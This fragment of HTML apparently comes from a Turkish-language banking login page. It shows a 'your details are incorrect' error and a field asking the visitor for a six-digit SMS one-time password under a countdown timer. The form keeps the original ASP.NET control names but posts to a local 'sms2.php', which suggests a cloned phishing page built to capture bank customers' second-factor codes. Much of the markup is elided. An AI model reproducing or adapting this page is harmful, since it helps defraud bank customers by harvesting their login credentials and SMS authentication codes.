...
<body>
    ...
    <form name="sms" method="post" action="sms2.php" id="sms" autocomplete="off">
<div>
</div>
...
<div>
                ...
                <div class="login-box left">
                    ...
                    <div class="login-err" style="display: block;">
                        <span class="icon"></span><span>
                            <span id="ctl00_errorLabel" class="error">Girdiğiniz bilgiler hatalıdır. Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.</span></span>
                    </div>
    ...
    <div id="ctl00_c_PnlSMS" class="PnlSMS">
        ...
        <div class="global-input global-input-Number clear">
            <div class="ctl00_c_TxtSMSformError formError" style="top: 0px; left: 252px; margin-top: -52px; opacity: 0.87;"><div class="formErrorContent">Lütfen geçerli SMS şifresi giriniz.<br></div><div class="formErrorArrow" style=""><div class="line10"><!-- --></div><div class="line9"><!-- --></div><div class="line8"><!-- --></div><div class="line7"><!-- --></div><div class="line6"><!-- --></div><div class="line5"><!-- --></div><div class="line4"><!-- --></div><div class="line3"><!-- --></div><div class="line2"><!-- --></div><div class="line1"><!-- --></div></div></div><input data-value="" autocomplete="off" name="pass2" type="password" maxlength="6" id="ctl00_c_TxtSMS" class="password password2" onmousedown=";" reqfieldmsg="Lütfen geçerli SMS şifresi giriniz." onmouseup=";" onpaste="return false;;;return false;;return false;;" keypadtype="numeric" onfocus=";thisFocus(this, event);" onblur=";thisBlur(this, event);" onkeypress=";" ondrop="return DisableDragAndDrop(event);" validation="validate[funcCall[VBValid]]" size="20" validdistype="tooltip" onkeydown=";return FcsToCtrl(event,&#39;ctl00_c_BtnLogin&#39;);" onkeyup=";;"><span></span>
            <label>
                SMS Şifrenizi Giriniz</label>
        </div>
        <div class="clear">
        </div>
        <span id="ctl00_c_SmsTimeCounter_LblTimeError" class="floatLeft smsTimerLabel">Kalan Süre :<span style="color:red;font-weight:bold">02:30</span> </span>
...
//            $('#ctl00_c_BtnLogin').click(function (e) {
//                if (jQuery('#aspnetForm').validationEngine('validate')) {
